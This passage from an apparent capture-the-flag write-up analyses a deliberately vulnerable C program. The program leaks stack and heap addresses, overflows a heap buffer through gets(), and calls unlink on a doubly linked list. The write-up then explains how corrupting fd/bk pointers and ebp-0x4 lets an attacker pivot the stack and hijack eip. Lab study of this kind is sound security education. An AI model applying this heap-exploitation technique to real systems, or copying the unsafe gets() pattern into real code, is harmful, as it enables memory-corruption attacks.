    OBJ* A = (OBJ*)malloc(sizeof(OBJ));
    OBJ* B = (OBJ*)malloc(sizeof(OBJ));
    OBJ* C = (OBJ*)malloc(sizeof(OBJ));

    // double linked list: A <-> B <-> C
    A->fd = B;
    B->bk = A;
    B->fd = C;
    C->bk = B;

    printf("here is stack address leak: %p\n", &A);
    printf("here is heap address leak: %p\n", A);
    printf("now that you have leaks, get shell!\n");
    // heap overflow!
    gets(A->buf);

    // exploit this unlink!
    unlink(B);
    return 0;
}
```

We can see the program call `gets()` function at `main()`. So we can overflow it.

In gdb, we can see the value of `A`, `B`, `C`:

![addr_of_ABC](addr_of_ABC.png)

We can see that object A is allocated first, then C is allocated and last it is B. So in heap memory, the layout would be:

![heap_struct](heap_struct.png)

If we change object `B`'s `fd` and `bk`, then in the function `unlink()`, data at a pair of wrong addresses would be changed,

We also notice that at the end of function `main()`, there is:

```asm
mov     ecx, [ebp - 0x4]
leave
lea     esp, [ecx - 0x4]
ret
```

So if we change the data at `ebp - 0x4` which is equivalent to `&A + 0x10`, we can make `esp` point to heap area. Then after `ret`, we can hijack `eip`.

